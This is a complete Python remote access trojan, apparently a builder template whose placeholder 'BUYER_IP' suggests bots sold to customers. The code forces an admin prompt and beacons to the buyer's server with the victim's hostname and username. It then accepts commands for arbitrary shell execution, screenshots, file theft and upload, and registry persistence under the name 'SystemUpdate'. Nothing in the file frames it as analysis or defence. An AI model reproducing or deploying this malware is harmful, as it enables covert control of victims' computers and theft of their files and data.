import socket
import json
import platform
import os
import subprocess
import time
import random
import ctypes
import sys
import base64
from datetime import datetime

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not is_admin():
    # Request admin privileges
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    sys.exit()

# Enable all network access
import socket
socket.setdefaulttimeout(30)

BUYER_IP = "{{BUYER_IP}}"
BUYER_PORT = {{BUYER_PORT}}

def get_system_info():
    return {
        "os": platform.system(),
        "hostname": platform.node(), 
        "username": os.getenv("USERNAME", "unknown"),
        "architecture": platform.architecture()[0],
        "admin_access": "Full",
        "network_access": "Full",
        "timestamp": datetime.now().isoformat()
    }

def execute_command(command):
    try:
        if command.startswith("cmd:"):
            # Full command execution with admin privileges
            result = subprocess.run(command[4:], shell=True, capture_output=True, text=True, timeout=30)
            output = result.stdout + result.stderr
        elif command == "sysinfo":
            output = json.dumps(get_system_info(), indent=2)
        elif command == "screenshot":
            try:
                import pyautogui
                screenshot = pyautogui.screenshot()
                import io
                img_bytes = io.BytesIO()
                screenshot.save(img_bytes, format='PNG')
                output = base64.b64encode(img_bytes.getvalue()).decode()
            except:
                output = "Screenshot failed - install pyautogui"
        elif command.startswith("download:"):
            # File download capability
            filepath = command[9:]
            try:
                with open(filepath, 'rb') as f:
                    output = base64.b64encode(f.read()).decode()
            except Exception as e:
                output = f"Download failed: {str(e)}"
        elif command.startswith("upload:"):
            # File upload capability  
            parts = command[7:].split(":", 1)
            if len(parts) == 2:
                filename, filedata = parts
                try:
                    with open(filename, 'wb') as f:
                        f.write(base64.b64decode(filedata))
                    output = f"Uploaded {filename}"
                except Exception as e:
                    output = f"Upload failed: {str(e)}"
            else:
                output = "Invalid upload command"
        elif command == "persistence":
            # Add persistence
            try:
                if platform.system() == "Windows":
                    # Windows persistence via registry
                    import winreg
                    key = winreg.HKEY_CURRENT_USER
                    subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
                    with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
                        winreg.SetValueEx(reg_key, "SystemUpdate", 0, winreg.REG_SZ, sys.executable)
                    output = "Persistence added to Windows startup"
                else:
                    output = "Persistence only supported on Windows"
            except Exception as e:
                output = f"Persistence failed: {str(e)}"
        else:
            output = f"Command executed: {command}"
    except Exception as e:
        output = f"Error: {str(e)}"
    return output

def connect_to_buyer():
    bot_id = f"{platform.node()}-{os.getenv('USERNAME', 'user')}-{random.randint(1000,9999)}"
    
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(30)
            sock.connect((BUYER_IP, BUYER_PORT))
            
            # Send connection info - NO LICENSE KEY NEEDED
            connect_msg = {
                "bot_id": bot_id,
                "system_info": get_system_info(),
                "status": "connected",
                "timestamp": datetime.now().isoformat()
            }
            
            sock.send(json.dumps(connect_msg).encode())
            
            # Full command execution loop
            while True:
                command = sock.recv(1024).decode()
                if not command:
                    break
                output = execute_command(command)
                sock.send(output.encode())
                
        except Exception as e:
            time.sleep(30)

if __name__ == "__main__":
    connect_to_buyer()
